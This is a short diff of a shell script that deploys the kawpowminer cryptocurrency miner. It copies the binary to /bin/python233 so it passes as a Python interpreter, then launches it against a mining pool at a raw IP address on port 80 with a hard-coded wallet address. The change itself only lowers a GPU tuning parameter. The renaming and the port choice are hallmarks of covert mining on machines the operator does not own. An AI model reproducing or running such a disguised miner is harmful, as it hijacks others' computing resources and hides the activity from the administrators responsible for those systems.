@@ -10,4 +10,4 @@ ls -la
 cd kawpowminer/build/kawpowminer/
 chmod +x kawpowminer
 cp kawpowminer /bin/python233
-python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 16
+python233 -U -P stratum+tcp://RMV17aQMgMPyPqJQ5H3WRQH37Njspi1SSK.RIG01@116.203.206.127:80  --cu-grid-size 256  --cu-block-size 512  --cu-parallel-hash 8
